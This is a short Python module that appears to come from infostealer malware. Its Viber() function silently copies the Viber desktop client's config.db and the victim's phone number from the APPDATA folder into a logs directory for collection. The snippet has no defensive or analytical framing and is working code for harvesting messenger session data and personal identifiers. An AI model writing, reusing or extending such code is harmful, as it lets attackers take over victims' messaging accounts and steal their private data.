from os import sep,listdir,makedirs,environ
from shutil import copy2
from manager.logger import Log
from preferences.config import config


def Viber():
        msgInfo = ""
        try:
            path = 'ViberPC'   
            roaming = environ["APPDATA"]
            pathtofile = f'{config.pathToLogs}\\Messengers\\Viber'
            makedirs(pathtofile, exist_ok=True)
            copy2(roaming+ sep + path+"/config.db",pathtofile)
            dirs = listdir(f"{roaming+sep+path}")
            for filename in dirs:
                if (filename.isdigit()):
                    with open(f"{pathtofile}\\phoneNumber.txt", "a", encoding="utf-8") as num:
                        num.write("+"+filename)
                    num.close()
            msgInfo+="\n∟📨Viber"
            return msgInfo
        except Exception as e:
            Log(f"Viber ---> {e}")
            return msgInfo